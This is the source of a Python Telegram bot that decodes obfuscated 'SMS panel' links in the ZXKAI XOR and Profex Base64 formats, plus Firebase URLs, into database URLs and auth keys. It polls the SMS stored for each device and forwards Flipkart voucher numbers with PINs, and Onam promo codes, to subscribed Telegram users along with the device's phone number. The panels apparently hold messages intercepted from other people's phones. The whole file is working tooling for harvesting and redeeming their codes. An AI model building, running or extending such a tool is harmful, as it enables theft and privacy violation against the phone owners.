"""
SMS Panel Monitor - Universal Version
======================================
- Supports ZXKAI (XOR), Profex (B64), and Standard Firebase panels
- Auto-detects Firebase structure (root, /clients, /devices, etc.)
- Fast parallel monitoring
- Flipkart & Onam formats supported
"""

import asyncio
import json
import os
import re
import sys
import time
import base64
import logging
import httpx
from datetime import datetime
from pathlib import Path
from urllib.parse import parse_qs, urlparse, unquote

from telegram import ReplyKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
STATE_FILE = Path(__file__).parent / "bot_state.json"
USERS_FILE = Path(__file__).parent / "users.json"
PANELS_FILE = Path(__file__).parent / "panels.json"

IS_INITIALIZED = False
MAX_CONCURRENT_REQUESTS = 30
semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

# ─── MESSAGE PATTERNS ─────────────────────────────────────────────────────────
REWARD_ONAM_PATTERN = re.compile(r"Reward Code for  Ujala Onam Consumer promo is ([A-Z0-9]+)")
REWARD_FLIPKART_PATTERN = re.compile(r"Flipkart Gift Voucher is ([0-9]+) PIN: ([0-9]+)")

# ─── DATA MANAGEMENT ──────────────────────────────────────────────────────────

def load_json(path, default):
    if path.exists():
        try:
            with open(path, "r") as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error loading {path}: {e}")
    return default

def save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving {path}: {e}")

def load_panels(): return load_json(PANELS_FILE, {})
def save_panels(panels): save_json(PANELS_FILE, panels)
def load_state(): return load_json(STATE_FILE, {})
def save_state(state): save_json(STATE_FILE, state)
def load_users(): return load_json(USERS_FILE, [])
def save_users_list(users):
    save_json(USERS_FILE, list(set(users)))

def add_user(chat_id: int):
    users = load_users()
    if chat_id not in users:
        users.append(chat_id)
        save_users_list(users)
    return users

# ─── DECODERS ─────────────────────────────────────────────────────────────────

def decode_zxkai(s):
    """Decodes ZXKAI XOR-obfuscated links."""
    try:
        b64 = s.replace("-", "+").replace("_", "/")
        padded = b64 + "=" * ((4 - len(b64) % 4) % 4)
        bin_data = base64.b64decode(padded)
        K = "ZXKAIv1_Xk9mP2wN7qL4vR6jH3cF8yT1ZbE5sA09"
        dec = bytearray()
        for i in range(len(bin_data)):
            dec.append(bin_data[i] ^ ord(K[i % len(K)]))
        obj = json.loads(dec.decode("utf-8"))
        if obj.get('u') and obj.get('k'):
            return obj['u'], obj['k']
    except: pass
    return None, None

def decode_profex(s):
    """Decodes Profex Base64 links."""
    try:
        decoded = base64.b64decode(s).decode("utf-8")
        if "|||" in decoded:
            parts = decoded.split("|||")
            return parts[0], parts[1] if len(parts) > 1 else ""
    except: pass
    return None, None

def get_panel_api_url(panel_url):
    """
    Extracts the internal API URL and Key from any panel link.
    Returns (api_url, auth_key)
    """
    parsed = urlparse(panel_url)
    qs = parse_qs(parsed.query)
    s_param = qs.get('s', [''])[0]
    
    # 1. Try ZXKAI
    url, key = decode_zxkai(s_param)
    if url: return url.rstrip('/'), key
    
    # 2. Try Profex
    url, key = decode_profex(s_param)
    if url: return url.rstrip('/'), key
    
    # 3. Try standard Firebase patterns
    if ".firebaseio.com" in parsed.netloc:
        url = panel_url.split('?')[0].split('.json')[0].rstrip('/')
        key = ""
        for k, v in qs.items():
            if k.lower() in ['key', 'auth', 'secret']:
                key = v[0]
                break
        return url, key
    
    return None, None

# ─── API HELPERS ──────────────────────────────────────────────────────────────

async def api_fetch(client, url, timeout=15):
    async with semaphore:
        try:
            resp = await client.get(url, timeout=timeout)
            if resp.status_code == 200:
                return resp.json(), None
            return None, f"HTTP {resp.status_code}"
        except Exception as e:
            return None, str(e)

def is_valid_device_id(k):
    if not isinstance(k, str): return False
    # Exclude common node names
    if k.lower() in ["messages", "clients", "devices", "users", "all_devices", "nodes", "settings", "sms", "logs"]:
        return False
    return 8 <= len(k) <= 45

async def discover_structure(client, api_url, auth_key):
    """
    Tries to find where devices and messages are stored.
    Returns (device_node, message_node)
    """
    auth_suffix = f"?auth={auth_key}" if auth_key else ""
    
    # 1. Check root
    root_data, error = await api_fetch(client, f"{api_url}/.json{auth_suffix}&shallow=true")
    if root_data and isinstance(root_data, dict):
        keys = list(root_data.keys())
        # Look for device IDs at root
        device_ids = [k for k in keys if is_valid_device_id(k)]
        if device_ids:
            # If devices are at root, check where messages are
            for m_node in ["messages", "sms", "logs"]:
                if m_node in keys: return "", m_node
            return "", "" # Both at root
            
        # Check common sub-nodes
        for node in ["clients", "devices", "users", "all_devices", "nodes"]:
            if node in keys:
                node_data, _ = await api_fetch(client, f"{api_url}/{node}.json{auth_suffix}&shallow=true")
                if node_data and isinstance(node_data, dict):
                    if any(is_valid_device_id(k) for k in node_data.keys()):
                        # Found devices, now find where messages are
                        # Often messages are at the same level as devices or in a separate node
                        msg_node = node
                        for m_node in ["messages", "sms", "logs"]:
                            if m_node in keys:
                                msg_node = m_node
                                break
                        return node, msg_node
                        
    return None, error

async def get_device_list(client, api_url, auth_key, device_node):
    auth_suffix = f"?auth={auth_key}" if auth_key else ""
    # FIX: Ensure slash before .json
    path = f"/{device_node}" if device_node else ""
    url = f"{api_url}{path}/.json{auth_suffix}&shallow=true"
    data, error = await api_fetch(client, url, 15)
    if error: return None, error
    if not data or not isinstance(data, dict): return [], None
    return [k for k in data.keys() if is_valid_device_id(k)], None

async def get_messages(client, api_url, auth_key, message_node, device_id, limit: int = 5) -> dict:
    auth_suffix = f"&auth={auth_key}" if auth_key else ""
    path = f"/{message_node}" if message_node else ""
    # FIX: Ensure correct path construction
    url = f'{api_url}{path}/{device_id}/.json?orderBy="%24key"&limitToLast={limit}{auth_suffix}'
    data, _ = await api_fetch(client, url, 15)
    return data or {}

async def get_device_number(client, api_url, auth_key, device_node, device_id) -> str:
    auth_suffix = f"?auth={auth_key}" if auth_key else ""
    path = f"/{device_node}" if device_node else ""
    url = f"{api_url}{path}/{device_id}/.json{auth_suffix}"
    data, _ = await api_fetch(client, url, 10)
    if isinstance(data, dict):
        # Try various fields
        for field in ["number", "phoneNumber", "phone", "fromNumber", "to", "sim_number"]:
            if field in data and data[field]: return str(data[field])
        # Try nested fields
        for nested in ["webhookEvent", "info", "details"]:
            if nested in data and isinstance(data[nested], dict):
                d = data[nested]
                for f in ["number", "phone", "to", "sendSms"]:
                    if f in d:
                        val = d[f]
                        if isinstance(val, dict) and "to" in val: return str(val["to"])
                        if isinstance(val, str): return val
    return ""

# ─── MESSAGE CLASSIFICATION ──────────────────────────────────────────────────

def classify_message(text: str):
    onam_match = REWARD_ONAM_PATTERN.search(text)
    if onam_match:
        return "onam", onam_match.group(1)
    
    flipkart_match = REWARD_FLIPKART_PATTERN.search(text)
    if flipkart_match:
        return "flipkart", (flipkart_match.group(1), flipkart_match.group(2))
    
    return None, None

# ─── TELEGRAM FORMATTING ──────────────────────────────────────────────────────

def format_reward(device_id, sender, message, reward_data, panel_name, msg_type, number="", dt=""):
    if msg_type == "onam":
        code_text = f"🎁 *Reward Code:* `{reward_data}`"
    elif msg_type == "flipkart":
        voucher, pin = reward_data
        code_text = f"🎁 *Voucher:* `{voucher}`\n🔑 *PIN:* `{pin}`"
    else:
        code_text = ""

    return (
        f"🎉 *REWARD DETECTED*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 *Panel:* {panel_name}\n"
        f"📲 *Device:* `{device_id}`\n"
        f"{f'🔢 *Number:* `{number}`' if number else ''}\n"
        f"📨 *From:* {sender}\n"
        f"⏰ *Time:* {dt}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{code_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 *Message:*\n"
        f"{message}\n"
    )

# ─── MONITORING JOB ──────────────────────────────────────────────────────────

async def process_device(client, panel_key, panel_config, device_id, state, users, app, is_new_panel):
    api_url = panel_config.get("api_url")
    auth_key = panel_config.get("auth_key", "")
    msg_node = panel_config.get("message_node", "")
    dev_node = panel_config.get("device_node", "")
    panel_name = panel_config.get("name", "Unknown")
    
    new_sent = 0
    try:
        messages = await get_messages(client, api_url, auth_key, msg_node, device_id, limit=5)
        if not messages: return 0

        for msg_key, msg_data in messages.items():
            if not isinstance(msg_data, dict): continue

            msg_id = str(msg_data.get("id", msg_key))
            full_key = f"{panel_key}:{device_id}:{msg_id}"

            if state.get(full_key): continue

            # Mark as seen and skip if bot just started OR if this panel was just added
            if not IS_INITIALIZED or is_new_panel:
                state[full_key] = True
                continue

            # Try to find message text and sender in various fields
            message_text = ""
            for f in ["message", "body", "text", "msg", "SMS"]:
                if f in msg_data:
                    message_text = msg_data[f]
                    break
            
            sender = "Unknown"
            for f in ["sender", "from", "address", "number"]:
                if f in msg_data:
                    sender = msg_data[f]
                    break
            
            dt = msg_data.get("dateTime", msg_data.get("time", ""))

            if not message_text: continue

            msg_type, reward_data = classify_message(str(message_text))
            if not msg_type:
                state[full_key] = True
                continue

            number = await get_device_number(client, api_url, auth_key, dev_node, device_id)
            text = format_reward(device_id, sender, message_text, reward_data, panel_name, msg_type, number, dt)

            for user_chat_id in users:
                try:
                    await app.bot.send_message(
                        chat_id=user_chat_id, text=text, 
                        parse_mode="Markdown", disable_web_page_preview=True
                    )
                except Exception as e:
                    logger.error(f"Send error: {e}")

            state[full_key] = True
            new_sent += 1
    except: pass
    
    return new_sent

async def monitor_panels(context: ContextTypes.DEFAULT_TYPE):
    global IS_INITIALIZED
    app = context.application
    panels = load_panels()
    state = load_state()
    users = load_users()

    if not users and IS_INITIALIZED: return

    total_new_sent = 0
    any_new_panel_init = False
    
    async with httpx.AsyncClient() as client:
        for panel_key, panel_config in list(panels.items()):
            api_url = panel_config.get("api_url")
            auth_key = panel_config.get("auth_key", "")
            if not api_url: continue

            init_key = f"init:{panel_key}"
            is_new_panel = not state.get(init_key, False)

            try:
                if panel_config.get("device_node") is None:
                    dev_node, msg_node = await discover_structure(client, api_url, auth_key)
                    if dev_node is not None:
                        panel_config["device_node"] = dev_node
                        panel_config["message_node"] = msg_node
                        save_panels(panels)
                    else:
                        continue
                
                dev_node = panel_config.get("device_node")
                device_ids, error = await get_device_list(client, api_url, auth_key, dev_node)
                
                if not device_ids:
                    if is_new_panel: state[init_key] = True
                    continue
                
                tasks = [
                    process_device(client, panel_key, panel_config, device_id, state, users, app, is_new_panel)
                    for device_id in device_ids
                ]
                results = await asyncio.gather(*tasks)
                total_new_sent += sum(results)
                
                if is_new_panel:
                    state[init_key] = True
                    any_new_panel_init = True
                
            except Exception as e:
                logger.error(f"Error monitoring panel {panel_key}: {e}")

    if not IS_INITIALIZED:
        IS_INITIALIZED = True
        save_state(state)
        logger.info("Bot started. Monitoring active.")
        return

    if total_new_sent > 0 or any_new_panel_init:
        save_state(state)

# ─── COMMAND HANDLERS ────────────────────────────────────────────────────────

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    add_user(chat_id)
    keyboard = ReplyKeyboardMarkup([["📊 Status", "📋 My Panels"], ["➕ Add Panel", "❌ Remove Panel"]], resize_keyboard=True)
    await update.message.reply_text(
        "🤖 *Universal SMS Panel Monitor*\n\n"
        "✅ Sabhi panels (ZXKAI, Profex, Firebase) supported hain.\n\n"
        "• 📊 Status — Panel check\n"
        "• 📋 My Panels — Panel list\n"
        "• ➕ Add Panel — Add multiple links\n"
        "• ❌ Remove Panel — Delete panel\n\n"
        f"👤 *Your Chat ID:* `{chat_id}`",
        parse_mode="Markdown", reply_markup=keyboard
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    panels = load_panels()
    users = load_users()
    text = "📊 *Monitor Status*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    total_devices = 0
    
    async with httpx.AsyncClient() as client:
        for panel_key, panel_config in panels.items():
            api_url = panel_config.get("api_url")
            auth_key = panel_config.get("auth_key", "")
            panel_name = panel_config.get("name", "Unknown")
            device_count = 0
            
            if not api_url:
                status = "🔴 Link Error"
            else:
                try:
                    dev_node = panel_config.get("device_node")
                    if dev_node is None:
                        dev_node, _ = await discover_structure(client, api_url, auth_key)
                    
                    if dev_node is not None:
                        device_ids, error = await get_device_list(client, api_url, auth_key, dev_node)
                        if error:
                            status = f"🔴 {error}"
                        else:
                            device_count = len(device_ids)
                            total_devices += device_count
                            status = "🟢 Active" if device_count > 0 else "🟡 No Devices"
                    else:
                        status = "🔴 Structure Error"
                except Exception as e:
                    status = f"🔴 Error: {str(e)[:30]}"
            
            text += f"*{panel_name}*\nStatus: {status} | Devices: {device_count}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    
    text += f"\n📦 Total Devices: {total_devices}\n👥 Active Users: {len(users)}"
    await update.message.reply_text(text, parse_mode="Markdown")

async def my_panels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    panels = load_panels()
    if not panels:
        await update.message.reply_text("❌ Koi panel nahi hai.")
        return
    text = "📋 *My Panels*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, (pk, pc) in enumerate(panels.items(), 1):
        text += f"*{i}. {pc.get('name')}*\n   URL: `{pc.get('panel_url')[:40]}...` \n\n"
    await update.message.reply_text(text, parse_mode="Markdown")

async def handle_add_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("➕ *Add New Panels*\n\nLinks bhejein (har link nayi line par).", parse_mode="Markdown")
    context.user_data["awaiting_url"] = True

async def handle_remove_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    panels = load_panels()
    if not panels:
        await update.message.reply_text("❌ Koi panel nahi hai.")
        return
    text = "❌ *Remove Panel*\n\n"
    panels_list = []
    for i, (pk, pc) in enumerate(panels.items(), 1):
        text += f"{i}. {pc.get('name')}\n"
        panels_list.append(pk)
    text += "\nNumber bhejo."
    context.user_data["awaiting_remove"] = True
    context.user_data["panels_list"] = panels_list
    await update.message.reply_text(text, parse_mode="Markdown")

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    
    if context.user_data.get("awaiting_url"):
        context.user_data["awaiting_url"] = False
        links = [line.strip() for line in text.split('\n') if line.strip()]
        if not links:
            await update.message.reply_text("❌ Link nahi mila.")
            return
            
        panels = load_panels()
        added = 0
        async with httpx.AsyncClient() as client:
            for link in links:
                if not link.startswith('http'): continue
                api_url, auth_key = get_panel_api_url(link)
                if not api_url: continue
                
                # Discovery
                dev_node, msg_node = await discover_structure(client, api_url, auth_key)
                
                pid = f"p_{int(time.time())}_{added}_{len(panels)}"
                panels[pid] = {
                    "name": f"Panel {len(panels)+1}", 
                    "api_url": api_url, 
                    "auth_key": auth_key,
                    "device_node": dev_node,
                    "message_node": msg_node,
                    "panel_url": link, 
                    "added_date": datetime.now().strftime("%Y-%m-%d")
                }
                added += 1
            
        save_panels(panels)
        await update.message.reply_text(f"✅ {added} Panels add ho gaye!")
        return

    if context.user_data.get("awaiting_remove"):
        context.user_data["awaiting_remove"] = False
        plist = context.user_data.get("panels_list", [])
        try:
            idx = int(text) - 1
            if 0 <= idx < len(plist):
                panels = load_panels()
                removed = panels.pop(plist[idx])
                save_panels(panels)
                await update.message.reply_text(f"✅ Panel '{removed.get('name')}' remove ho gaya!")
            else:
                await update.message.reply_text("❌ Galat number!")
        except:
            await update.message.reply_text("❌ Galat input!")
        return

# ─── MAIN ─────────────────────────────────────────────────────────────────────

async def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not set!")
        sys.exit(1)

    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(filters.Regex(r"^(📊 Status|Status)$"), status_command))
    application.add_handler(MessageHandler(filters.Regex(r"^(📋 My Panels|My Panels)$"), my_panels_command))
    application.add_handler(MessageHandler(filters.Regex(r"^(➕ Add Panel|Add Panel)$"), handle_add_panel))
    application.add_handler(MessageHandler(filters.Regex(r"^(❌ Remove Panel|Remove Panel)$"), handle_remove_panel))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))

    application.job_queue.run_repeating(monitor_panels, interval=15, first=5)

    logger.info("Bot starting...")
    async with application:
        await application.initialize()
        await application.start()
        await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
        while True:
            await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit): pass
    except Exception as e:
        logger.fatal(f"Fatal error: {e}")
